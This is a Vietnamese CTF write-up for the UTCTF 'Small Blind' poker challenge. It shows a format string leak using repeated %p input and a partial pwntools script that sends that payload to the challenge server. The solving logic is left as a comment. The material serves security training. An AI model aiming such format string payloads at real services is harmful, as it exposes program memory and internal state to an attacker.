---
title: "UTCTF - Binary Exploitation - Small Blind"
date: 2024-01-10 00:00:00 +0700
categories: [CTF, Binary Exploitation]
tags: [pwn, format-string, leak, utctf]
author: datious
description: "UTCTF writeup: Small Blind — format string vulnerability để leak stack values và crack game Texas Hold'em."
---

# UTCTF - Binary Exploitation - Small Blind
**Author: D1n0_09**

![Challenge](https://hackmd.io/_uploads/Bk-X3zEq-g.png)

Đây là 1 challenge đoán cách để crack chương trình — khi đó chương trình sẽ check và đưa ra flag. Dựa vào phần description ta có thể đoán được: chỉ khi chương trình kết thúc và ta có được số chip **vượt 1000** thì sẽ win.

## 1. Lỗ hổng

![Format String Leak](https://hackmd.io/_uploads/HkmxpGNcbg.png)

Nhìn vào đây có thể thấy rằng khi nhập `%p` thì sẽ **leak được địa chỉ trên stack** → **Format String Vulnerability**.

Nhập cỡ 29 `%p` để xem leak được gì:

```
(pwnenv)─(kali㉿kali)-[~/Downloads/utctf]
└─$ python3 test.py
[q] Opening connection to challenge.utctf.live on port 7255: Trying 23.139.8...
[+] Opening connection to challenge.utctf.live on port 7255: Done
[+] Receiving all data: Done (1.27KB)
[*] Closed connection to challenge.utctf.live port 7255

╔══════════════════════════════════════════╗
║          ♣ ♦ Texas Hold'em ♥ ♠           ║
╠══════════════════════════════════════════╣
║  Small blind: 10    Big blind: 20        ║
```

## 2. Chiến lược

Dùng format string để:
1. **Leak các giá trị trên stack** (cards, seed, random values)
2. Từ đó **đoán chính xác bài** của đối thủ
3. **Liên tục thắng** để chips vượt 1000

```python
from pwn import *

def solve():
    p = remote("challenge.utctf.live", 7255)
    
    # Nhập format string để leak ngẫu nhiên seed hoặc card values
    p.sendlineafter("Name: ", "%p " * 20)
    
    # Parse leak
    leak = p.recvline()
    leaked_vals = [int(x, 16) for x in leak.split() if x.startswith(b'0x')]
    
    # ... phân tích leaked values để đoán kết quả game
    # Liên tục gọi đúng để accumulate chips > 1000
    
    p.interactive()
```

> **Key insight:** Format string không chỉ dùng để leak địa chỉ — trong game challenges, nó có thể tiết lộ **internal state** của chương trình (cards, seeds, counters) giúp ta luôn thắng.
